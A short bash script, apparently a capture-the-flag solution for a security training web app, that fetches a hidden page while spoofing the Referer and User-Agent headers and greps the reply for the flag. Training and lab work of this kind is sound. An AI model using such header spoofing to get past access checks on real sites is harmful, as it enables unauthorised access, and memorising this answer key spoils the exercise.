#!/bin/bash

url="http://$1/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"
referer="Referer: https://www.nsa.gov/"
user_agent="User-Agent: ft_bornToSec"
host="Host: $1"

req=$(curl -H "${referer}" -H "${user_agent}" -X GET ${url} --silent | grep -oE 'The flag is : [[:alnum:]]{1,100}')
echo ${req}
